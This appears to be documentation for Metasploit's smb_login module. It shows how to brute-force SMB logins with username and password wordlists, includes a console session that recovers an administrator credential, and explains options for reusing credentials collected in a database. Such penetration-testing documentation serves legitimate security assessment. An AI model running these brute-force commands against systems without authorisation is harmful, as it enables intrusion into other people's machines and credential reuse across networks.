The smb_login module is used to bruteforce SMB remotely. SMB credentials are extra valuable because they are system credentials, and you can probably reuse some of them to log in to more machines.

## Vulnerable Application

To use smb_login, make sure you are able to connect to a SMB service that supports SMBv1.

## Verification Steps

The following demonstrates a basic scenario of using the [built-in wordlists](https://github.com/rapid7/metasploit-framework/tree/master/data/wordlists) to brute-force SMB:

```
msf > use auxiliary/scanner/smb/smb_login 
msf auxiliary(smb_login) > set RHOSTS 192.168.1.80
RHOSTS => 192.168.1.80
msf auxiliary(smb_login) > set USER_FILE /Users/wchen/rapid7/msf/data/wordlists/unix_users.txt
USER_FILE => /Users/wchen/rapid7/msf/data/wordlists/unix_users.txt
msf auxiliary(smb_login) > set PASS_FILE /Users/wchen/rapid7/msf/data/wordlists/unix_passwords.txt
PASS_FILE => /Users/wchen/rapid7/msf/data/wordlists/unix_passwords.txt
msf auxiliary(smb_login) > run

[+] 192.168.1.80:445      - 192.168.1.80:445 SMB - Success: '.\root:monkey' Administrator
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(smb_login) > 
```

If you have a database connected, you should also see this credential logged:

```
msf auxiliary(smb_login) > creds
Credentials
===========

host          origin        service        public  private  realm  private_type
----          ------        -------        ------  -------  -----  ------------
192.168.1.80  192.168.1.80  445/tcp (smb)  root    monkey          Password

msf auxiliary(smb_login) 
```

## Options

By default, the smb_login module only requires the RHOSTS option to run. But in reality, you will
also need to supply user names and passwords. The following options are available to support
different credential formats:

**The USER_FILE option**

If you happen to manage all the found user names in a separate file, then this option would be
suitable for that. One per line.

An example of setting USER_FILE:

```
set USER_FILE [path to file]
```

**The PASS_FILE option**

If you happen to manage all the found passwords in a separate file, then this option would be
suitable for that. One per line.

```
set PASS_FILE [path to file]
```

**The USERPASS_FILE option**

If each user should be using a specific password in your file, then you can use this option. One
username/password per line:

```
set USERPASS_FILE [path to file]
```

**The DB_ALL_CREDS option**

This option allows you to reuse all the user names and passwords collected by the database:

```
set DB_ALL_CREDS true
```

**The DB_ALL_PASS option**

This option allows you to reuse all the passwords collected by the database.

```
set DB_ALL_PASS true
```

**The DB_ALL_USERS option**

This option allows you to reuse all the user names collected by the database.

```
set DB_ALL_USERS true
```

**The SMBUser option**

If you are testing a specific user, use this option.

```
set SMBUser [user name]
```

**The SMBPass option**

If you are testing a specific password, use this option.

```
set SMBPass [password]
```

Note: If an account has been successfully brute-forced, that account will not be tried again.

Additionally, if you wish to disable automatic detection of all-access systems, you can change the following option:

**The DETECT_ANY_AUTH option**

This option enables detection of systems accepting any authentication. A bogus login will be attempted.

```
set DETECT_ANY_AUTH false
```
